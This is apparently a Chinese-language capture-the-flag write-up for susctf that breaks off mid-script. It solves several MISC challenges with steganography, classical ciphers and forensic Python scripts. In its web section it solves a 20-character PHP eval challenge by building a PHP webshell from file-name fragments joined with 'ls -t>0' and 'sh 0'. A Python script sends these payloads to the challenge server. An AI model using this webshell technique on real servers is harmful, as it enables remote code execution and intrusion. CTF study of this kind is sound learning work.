class=\"mord\">6</span><span class=\"mord\">3</span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">9</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">5</span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">0</span><span class=\"mord\">3</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">2</span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">6</span><span class=\"mord\">0</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mord\">9</span><span class=\"mord\">2</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">2</span><span class=\"mord\">8</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">5</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">2</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">3</span><span class=\"mord\">5</span><span class=\"mord\">1</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">6</span><span class=\"mord\">3</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">9</span></span></span></span></p>\n<p>在网页中输入以上内容后就可以得到 flag：</p>\n<p><img data-src=\"image-20231016090703648.png\" alt=\"image-20231016090703648\"></p>\n<p><code>susctf&#123;480ffdaf-a6bf-4b70-abb0-3fd0f2c3aeae&#125;</code></p>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"百团大战改\"><a class=\"markdownIt-Anchor\" href=\"#百团大战改\">#</a> 百团大战改</h3>\n<p>题目如下所示：</p>\n<p><img data-src=\"image-20231016090935860.png\" alt=\"image-20231016090935860\"></p>\n<p>二维码扫描后得到如下结果</p>\n<p>Unicode：</p>\n<pre><code>\\u58eb\\u4eba\\u0020\\u5927\\u571f\\u0020\\u5927\\u4eba\\u0020\\u4e2d\\u53e3\\u0020\\u4e2d\\u4eba\\u0020\\u4eba\\u5de5\\u0020\\u592b\\u7f8a\\u0020\\u4e2d\\u7530\\u0020\\u592b\\u592b\\u0020\\u4eba\\u4eba\\u0020\\u4eba\\u7531\\u0020\\u5929\\u4eba\\u0020\\u4eba\\u53e3\\u0020\\u4e2d\\u4eba\\u0020\\u738b\\u5927\\u0020\\u4e2d\\u53e3\\u0020\\u592b\\u5927\n</code></pre>\n<p>将上述 Unicode 转换为汉字：</p>\n<pre><code>士人 大土 大人 中口 中人 人工 夫羊 中田 夫夫 人人 人由 天人 人口 中人 王大 中口 夫大\n</code></pre>\n<p>一看就知道这是当铺密码，进行解码得到以下数字。</p>\n<pre><code>53 55 53 20 23 34 79 20 77 33 31 63 30 23 65 20 75\n</code></pre>\n<p>猜测以上数字为 ASCII 码的 16 进制数字，对其进行转换可以得到如下内容：</p>\n<pre><code>SUS #4y w31c0#e u\n</code></pre>\n<p>直接提交这个内容是不正确的，推测图片中隐藏有其他内容，对 png 文件使用 binwalk 进行检查，发现了隐藏的 zip 文件，但是需要密码。那上面的字符串进行尝试，发现密码正确，得到剩下的部分：</p>\n<p><img data-src=\"image-20231016091906862.png\" alt=\"image-20231016091906862\"></p>\n<p>_join us!</p>\n<p>对所有内容进行拼接，得到 flag：</p>\n<p><code>susctf&#123;SUS #4y w31c0#e u_join us!&#125;</code></p>\n<h3 id=\"sustv\"><a class=\"markdownIt-Anchor\" href=\"#sustv\">#</a> SUSTV</h3>\n<p>本题拿到音频后，发现最后一段的声音非常的不和谐，猜测这段声音中隐藏的有信息，在网上找到了解这种题目的<span class=\"exturl\" data-url=\"aHR0cHM6Ly93cC5jdGYuc2hvdy9kLzEwMQ==\">方法</span>，下载 SSTV 软件，使用虚拟声卡将音乐输入进去，可以得到一张二维码：</p>\n<p><img data-src=\"image-20231014145417282.png\" alt=\"image-20231014145417282\"></p>\n<p>扫码就可以拿到 flag  <code>susctf&#123;b7c55a86-56f4-4ebe-ba57-03d3cae609ea&#125;</code></p>\n<h3 id=\"can_u_find_meeeeee\"><a class=\"markdownIt-Anchor\" href=\"#can_u_find_meeeeee\">#</a> Can_u_find_meeeeee?</h3>\n<p>题目为一个 eee 文件：</p>\n<p><img data-src=\"image-20231016092943497.png\" alt=\"image-20231016092943497\"></p>\n<p>扔进 010 中进行查看，发现开头为 50 4B 03 04：</p>\n<p><img data-src=\"image-20231016093108356.png\" alt=\"image-20231016093108356\"></p>\n<p>典型的 zip 文件，改后缀。里面文件很多，把查看隐藏文件打开，进行查找，可以找到一个隐藏的文件夹 <code>sdsda</code> ，其中含有一个隐藏文件  <code>.me</code> ：</p>\n<p><img data-src=\"image-20231014124907074.png\" alt=\"image-20231014124907074\"></p>\n<p>打开后是乱码，但是最下面有一段：</p>\n<p><img data-src=\"image-20231014124944686.png\" alt=\"image-20231014124944686\"></p>\n<p>提取出来为： <code>susctf&#123;S8KlL4/mSxg9efLxKsk5eiPJOf/rKlG9K4hXS8gmTfGtKxGk&#125;</code> ，直接提交发现不对，觉得应该是加密过的，拿到 cyberchef 里面 magic 一下得到正确的 flag</p>\n<p><img data-src=\"image-20231014125102495.png\" alt=\"image-20231014125102495\"></p>\n<p><code>susctf&#123;066f072e-96fc-d9b4-01ca-b1a057513ba5&#125;</code></p>\n<h3 id=\"算术\"><a class=\"markdownIt-Anchor\" href=\"#算术\">#</a> 算术！</h3>\n<p>题目：</p>\n<p><img data-src=\"image-20231014141431854.png\" alt=\"image-20231014141431854\"></p>\n<p>本题目根据 arithmetic coding 规则进行解码即可，过程如下：</p>\n<p><img data-src=\"IMG_2175.PNG\" alt=\"IMG_2175\"></p>\n<p>因而 flag 为： <code>susctf&#123;aloha&#125;</code></p>\n<h3 id=\"旺旺的课程表\"><a class=\"markdownIt-Anchor\" href=\"#旺旺的课程表\">#</a> 旺旺的课程表</h3>\n<p>题目如下：</p>\n<p><img data-src=\"task.png\" alt=\"task\"></p>\n<p>拿到图片检查一下长宽是否正确：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#使用 python [脚本文件名] [图片文件名]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> zlib</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> struct</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    all_b <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    crc32key <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>all_b<span class=\"token punctuation\">[</span><span class=\"token number\">29</span><span class=\"token punctuation\">:</span><span class=\"token number\">33</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    data <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span>all_b<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">:</span><span class=\"token number\">29</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    n <span class=\"token operator\">=</span> <span class=\"token number\">4095</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">for</span> w <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        width <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span>struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'>i'</span><span class=\"token punctuation\">,</span> w<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">for</span> h <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            height <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span>struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'>i'</span><span class=\"token punctuation\">,</span> h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                data<span class=\"token punctuation\">[</span>x<span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> width<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                data<span class=\"token punctuation\">[</span>x<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> height<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            crc32result <span class=\"token operator\">=</span> zlib<span class=\"token punctuation\">.</span>crc32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">if</span> crc32result <span class=\"token operator\">==</span> crc32key<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"宽为：\"</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>width<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"高为：\"</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>height<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"image-20231014180520256.png\" alt=\"image-20231014180520256\"></p>\n<p><img data-src=\"image-20231014180544950.png\" alt=\"image-20231014180544950\"></p>\n<p>长宽结果没有什么异常。使用 zsteg 也没有发现什么：</p>\n<p><img data-src=\"image-20231014181934718.png\" alt=\"image-20231014181934718\"></p>\n<p>pngcheck 也没有问题（如果某一块没有满但后面却还有 IDAT 块则说明后面的块是 “假” 的），但是都正常：</p>\n<p><img data-src=\"image-20231014182314299.png\" alt=\"image-20231014182314299\"></p>\n<p>进入 Stegsolve 中进行尝试，切换了一下视图，结果发现了 二维码：</p>\n<p><img data-src=\"image-20231014183019450.png\" alt=\"image-20231014183019450\"></p>\n<p>扫描二维码得到如下内容，维吉尼亚密码：</p>\n<pre><code>vigenere:T29tAGSCf2KaZAXeBkylQrsiw3MhR3PocagnRqWrEhX5JYS4PHVlRFGnHb04LFZlPKTlANV3HcSbKHVyEB0uCXpaboShCJTycQEtBETffB4=\n</code></pre>\n<p>题目对课表内容有所提示，猜测是夏多密码。根据如下所示过程可以得到序号所对应的  <code>夏多密码</code> ：</p>\n<p><img data-src=\"3001F020D723381FDA50CD419B8FDE52.png\" alt=\"3001F020D723381FDA50CD419B8FDE52\"></p>\n<p>所以 <code>猜测</code>  维吉尼亚密码的 KEY 为：</p>\n<pre><code>CYBERSECURITY\n</code></pre>\n<p>进行解密得到：</p>\n<pre><code>R29vZCBKb2IgISEgZmxhZzogc3VzY3RmezcwZmUxNzE5LWU4ODEtNDMwZi04NDBkLTBhYTE3ZjUzMGRhMX0sIGhhdmUgYSBuaWNlIGRheX4=\n</code></pre>\n<p>再使用 Base64：</p>\n<p><img data-src=\"image-20231014194422489.png\" alt=\"image-20231014194422489\"></p>\n<p>就可以拿到正确的 flag：</p>\n<p><code>susctf&#123;70fe1719-e881-430f-840d-0aa17f530da1&#125;</code></p>\n<h3 id=\"ai-kerasmodelsummary\"><a class=\"markdownIt-Anchor\" href=\"#ai-kerasmodelsummary\">#</a> AI-keras.Model.summary()</h3>\n<p>题目如下：</p>\n<p><img data-src=\"image-20231016093708125.png\" alt=\"image-20231016093708125\"></p>\n<p>使用 010 打开 keras 文件进行查找：</p>\n<p><img data-src=\"image-20231015102445681.png\" alt=\"image-20231015102445681\"></p>\n<p><code>WelcomeLOLAndhereisyourflag have_fun_with_deep_conv_net</code></p>\n<p>只需要提交带有连字符的部分，即：</p>\n<p><code>have_fun_with_deep_conv_net</code></p>\n<p>因而 flag 为：</p>\n<p><code>susctf&#123;have_fun_with_deep_conv_net&#125;</code></p>\n<h3 id=\"do_u_know_jeremiah_denton\"><a class=\"markdownIt-Anchor\" href=\"#do_u_know_jeremiah_denton\">#</a> Do_u_know_Jeremiah_Denton?</h3>\n<p>题目如下：</p>\n<p><img data-src=\"image-20231016093806751.png\" alt=\"image-20231016093806751\"></p>\n<p>对音频文件进行了常规方法分析后，并没有什么发现，我也不知道 Jeremiah_Denton 是谁，还特意去瞅了瞅，这个人是越战期间用眼睛打摩斯电码的人。但是题目没有任何地方有类似摩斯电码的声音。查看题目提示： <code>private</code> ，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnRtcy5pbS8yMDIxLzAzLzMwL2N0Zi1tcDMtY29weXJpZ2h0LWJpdC5odG1s\">搜索了一下</span>发现了利用 <code>private bit</code>  隐藏信息的方法，于是把文件丢入 010 中进行查看：</p>\n<p><img data-src=\"image-20231015151251449.png\" alt=\"image-20231015151251449\"></p>\n<p>可以看出，第一个帧块的开始地址是  <code>0x19C</code> , 且当 padding 为 0 是，帧大小为  <code>0x1A1</code> ，padding 为 1 时，帧大小为  <code>0x1A2</code> ，private 位置是帧的第二字节的倒数第一位，padding 位置是帧的第二字节的倒数第二位。构建脚本获取所有帧所包含的 private 的值，并将其转为 ASCII：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> binascii</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">0x19C</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x2</span>  <span class=\"token comment\"># 起始位置</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin\">file</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'QueenCard.mp3'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 提取</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">while</span> n <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x27119C</span><span class=\"token operator\">+</span><span class=\"token number\">0x1A1</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 结束位置</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>seek<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    head <span class=\"token operator\">=</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    padding <span class=\"token operator\">=</span> <span class=\"token string\">'&#123;:08b&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>head<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>seek<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    file_read_result <span class=\"token operator\">=</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    result <span class=\"token operator\">+=</span> <span class=\"token string\">'&#123;:08b&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>file_read_result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    n <span class=\"token operator\">+=</span> <span class=\"token number\">0x1A2</span> <span class=\"token keyword\">if</span> padding <span class=\"token operator\">==</span> <span class=\"token string\">\"1\"</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0x1A1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># 拼接</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>textArr <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">'.&#123;'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'&#125;'</span><span class=\"token punctuation\">,</span> result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> textArr<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    flag <span class=\"token operator\">=</span> flag <span class=\"token operator\">+</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>运行得到 flag：</p>\n<p><img data-src=\"image-20231016093926131.png\" alt=\"image-20231016093926131\"></p>\n<p><code>susctf&#123;3fa723a9-92c1-17fc-8364-50457b1e95c6&#125;</code></p>\n<h3 id=\"问卷调查\"><a class=\"markdownIt-Anchor\" href=\"#问卷调查\">#</a> 问卷调查</h3>\n<p><code>susctf&#123;Th4nK_Y0u_F0R_Y0UR_Partic1pa71oN&#125;</code></p>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> web</h2>\n<h3 id=\"php-is-all-you-need\"><a class=\"markdownIt-Anchor\" href=\"#php-is-all-you-need\">#</a> PHP Is All You Need</h3>\n<p>题目如下所示：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// Revenge of last year's signin challenge</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// Now you can't use a webshell tool to connect :)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">20</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>该题目对输入的字符数目有所限制，对于这类题目，经过<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS91XzE1ODc4NTY4LzU4NTk3MjI=\">互联网学习</span>，有一种通用解法如下所示：</p>\n<p>首先将需要写入的语句进行 Base64 编码，避免特殊字符：</p>\n<p><img data-src=\"image-20231013184410011.png\" alt=\"image-20231013184410011\"></p>\n<p>再构建需要执行的语句：</p>\n<pre><code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php\n</code></pre>\n<p>对于上述需要执行的语句，我们可以通过在目录中构建以字符为命名的文件，利用 <code>ls -t&gt;0</code>  使其写入 0 文件，再利用 shell 执行文件 0，构建我们所需要的 1.php 文件：</p>\n<pre><code>&gt;hp\n&gt;1.p\\\\\n&gt;d\\&gt;\\\\\n&gt;\\ -\\\\\n&gt;e64\\\\\n&gt;bas\\\\\n&gt;7\\|\\\\\n&gt;XSk\\\\\n&gt;Fsx\\\\\n&gt;dFV\\\\\n&gt;kX0\\\\\n&gt;bCg\\\\\n&gt;XZh\\\\\n&gt;AgZ\\\\\n&gt;waH\\\\\n&gt;PD9\\\\\n&gt;o\\ \\\\\n&gt;ech\\\\\nls -t&gt;0\nsh 0\n</code></pre>\n<p>使用如下脚本进行攻击：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://game.ctf.seusus.com:38248/index.php?cmd=system('&#123;0&#125;');\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+]start attack!!!\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/mnt/e/ramDownload/payload.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*]\"</span> <span class=\"token operator\">+</span> url<span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#检查是否攻击成功</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>test <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"http://game.ctf.seusus.com:38248/index.php\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span> test<span class=\"token punctuation\">.</span>status_code <span class=\"token operator\">==</span> requests<span class=\"token punctuation\">.</span>codes<span class=\"token punctuation\">.</span>ok<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*]Attack success!!!\"</span><span class=\"token 